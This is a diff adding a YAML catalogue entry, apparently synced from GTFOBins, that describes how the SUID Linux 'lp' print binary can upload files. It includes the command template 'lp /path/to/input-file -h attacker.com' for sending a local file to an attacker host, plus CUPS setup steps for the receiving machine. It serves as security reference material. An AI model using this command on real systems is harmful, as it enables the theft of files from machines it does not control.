@@ -1,0 +1,32 @@
+id: gtfobins/lp/upload/suid
+type: binary
+platform: linux
+name: lp
+phases:
+- exfiltration
+- privilege-escalation
+capabilities:
+- file-upload
+privilege_required: suid
+sources:
+- project: GTFOBins
+  upstream_url: https://gtfobins.github.io
+  license: MIT (verify upstream LICENSE)
+  upstream_version: acd5246
+  last_synced: '2026-08-25'
+commands:
+- template: lp /path/to/input-file -h attacker.com
+  comment: 'This requires `cups` to be installed. Run the following on the attacker box beforehand:
+
+
+    1. `lpadmin -p printer -v socket://localhost -E` to create a virtual printer;
+
+    2. `lpadmin -d printer` to set the new printer as default;
+
+    3. `cupsctl --remote-any` to enable printing from the Internet.'
+references:
+- https://gtfobins.github.io/gtfobins/lp/
+tags:
+- linux
+- unix
+- gtfobins
